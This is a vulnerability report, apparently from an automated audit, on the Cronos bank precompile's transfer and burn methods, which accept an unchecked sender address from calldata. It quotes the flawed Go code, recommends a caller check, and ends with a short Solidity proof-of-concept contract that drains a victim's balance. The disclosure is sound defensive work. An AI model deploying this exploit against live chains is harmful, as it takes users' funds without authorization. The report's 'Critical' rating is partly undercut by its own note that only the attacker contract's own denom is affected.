### Title
Unauthenticated `sender` Argument in `BankContract.transfer()` Enables Unauthorized Native Token Drain — (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` method accepts the `sender` address as a raw calldata argument and uses it directly as the `from` address in `bankKeeper.SendCoins`, with no check that `sender` equals the actual EVM caller (`contract.Caller()`). Any unprivileged EVM contract can call `transfer(victimAddress, attackerAddress, amount)` to drain native bank tokens from an arbitrary victim.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` case:

```go
sender := args[0].(common.Address)   // ← fully user-controlled calldata
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())  // ← derived from attacker-supplied input
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())    // "evm/<calling_contract_address>"
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`sender` (which becomes `from`) is decoded directly from the ABI-encoded call input. There is no assertion that `sender == contract.Caller()`, no allowance/approval check, and no other authorization guard. The only guard present is `checkBlockedAddr(to)`, which only protects the recipient side. [2](#0-1) 

The denom is `evm/<contract.Caller()>`, meaning the token type is determined by whichever EVM contract calls the precompile. An attacker who deploys a contract at address `0xATTACKER` controls the denom `evm/0xATTACKER` and can call `transfer(victim, attacker, amount)` to move that token out of any victim account.

The same class of bug also affects the `burn` case: `addr` (the address whose tokens are burned) is taken from calldata without verifying it is the caller. [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized transfer of CRC20/native EVM-denom tokens.**

Any account holding `evm/<attacker_contract>` tokens (e.g., received via the `mint` path, an airdrop, or a DEX trade) can have its entire balance drained to an arbitrary address by the contract owner or any caller of that contract. This satisfies the Critical impact class: *unauthorized transfer of precompile-controlled assets*.

---

### Likelihood Explanation

The entry path is fully unprivileged:
1. Deploy any EVM contract (no special role required).
2. Call the bank precompile at `0x0000…0064` with method selector for `transfer`, passing an arbitrary `sender`.
3. The Cosmos bank module executes `SendCoins(from=victim, to=attacker, ...)` with no further checks.

The only precondition is that the victim holds tokens with denom `evm/<attacker_contract_address>`, which is achievable via the `mint` method of the same precompile (also unconstrained by caller identity for the recipient).

---

### Recommendation

In the `TransferMethodName` case, enforce that the `sender` argument matches the actual EVM caller:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be caller")
}
```

Alternatively, implement an ERC-20-style allowance mechanism so that a third-party contract may only transfer tokens it has been explicitly approved to move.

The same fix should be applied to the `BurnMethodName` case, where `addr` (the account to burn from) is also taken from calldata without caller verification.

---

### Proof of Concept

```solidity
// Attacker deploys this at address 0xATTACKER
interface IBank {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Exploit {
    IBank constant bank = IBank(address(0x64)); // bank precompile

    // Drain victim's "evm/0xATTACKER" native tokens
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // bankKeeper.SendCoins(victim → attacker, denom="evm/0xATTACKER", amount)
        // executes with no authorization from victim
    }
}
```

1. Attacker deploys `Exploit` at `0xATTACKER`.
2. Victim acquires `evm/0xATTACKER` tokens (e.g., via `bank.mint(victim, amount)` called by the same contract, or via any secondary market).
3. Attacker calls `Exploit.drain(victim, attacker, victimBalance)`.
4. `bankKeeper.SendCoins` transfers the full balance from victim to attacker; victim has no recourse. [4](#0-3)
